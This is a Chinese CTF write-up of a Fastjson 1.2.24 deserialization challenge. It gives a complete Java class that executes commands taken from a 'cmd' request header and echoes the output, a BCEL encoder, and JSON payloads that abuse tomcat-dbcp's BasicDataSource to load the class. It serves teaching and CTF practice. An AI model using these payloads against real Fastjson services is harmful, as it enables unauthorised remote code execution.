---
title: 记一次CTF出题之FastjsonBCEL_WP篇
date: 2024-03-18 18:53:00 +0800
img_path: /
categories: [CTF, CTF出题记录]
tags: [CTF, CTF出题记录]  
---



# WEB-FastjsonBCEL

## 一、查看题目信息

题目给出一个jar包，反编译后查看`Controller`层内容如下：

![image-20240318182129668](assets/image-20240318182129668.png)

`/parse`路由下存在`FastJson`解析可能存在反序列化漏洞。



## 二、题目分析

查看`pom.xml`文件

![image-20240318182330944](assets/image-20240318182330944.png)

注意到存在`tomcat-dbcp`依赖和`fastjson`依赖，且版本分别为`9.0.8`、 `1.2.24`。所以可以使用`FastJson`借助`tomcat-dbcp`实现BCEL字节码加载的方式。

还是以`BCEL`打回显为目的，恶意类如下：

```java
package org.example;

import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringEcho {
    static {
        try {
            Class v0 = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Method v1 = v0.getMethod("getRequestAttributes");
            Object v2 = v1.invoke(null);
            v0 = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            v1 = v0.getMethod("getResponse");
            Method v3 = v0.getMethod("getRequest");
            Object v4 = v1.invoke(v2);
            Object v5 = v3.invoke(v2);
            Method v6 = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Method v7 = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader",String.class);
            v7.setAccessible(true);
            v6.setAccessible(true);
            Object v8 = v6.invoke(v4);
            String v9 = (String) v7.invoke(v5,"cmd");
            String[] v10 = new String[3];
            if (System.getProperty("os.name").toUpperCase().contains("WIN")){
                v10[0] = "cmd";
                v10[1] = "/c";
            }else {
                v10[0] = "/bin/sh";
                v10[1] = "-c";
            }
            v10[2] = v9;
            v8.getClass().getDeclaredMethod("println",String.class).invoke(v8,(new Scanner(Runtime.getRuntime().exec(v10).getInputStream())).useDelimiter("\\A").next());
            v8.getClass().getDeclaredMethod("flush").invoke(v8);
            v8.getClass().getDeclaredMethod("clone").invoke(v8);
        } catch (Exception var11) {
            var11.getStackTrace();
        }
    }
}

```

生成BCEL编码`payload`：

```java
package org.example;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;

public class Bcel {

    public static void main(String[] args) throws Exception {
        JavaClass javaClass = Repository.lookupClass(SpringEcho.class);
        String code = "$$BCEL$$"+Utility.encode(javaClass.getBytes(),true);
        System.out.println(code);
        //new ClassLoader().loadClass(code).newInstance();
    }
}
```

因为漏洞触发点为`JSONObject.parse(jsonString)`所以最终`payload`形式如下：

```json
{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$A$xxxxxxxxxxxx"
        }
    }: "x"
}
```

如果是`parseObject()`的形式，`payload`也可以如下:

```json
{
        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
        "driverClassLoader": {
            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$xxxxxxxxxxxx"
}
```



## 三、漏洞利用

生成拼接好`payload`传入：

![image-20240318183625514](assets/image-20240318183625514.png)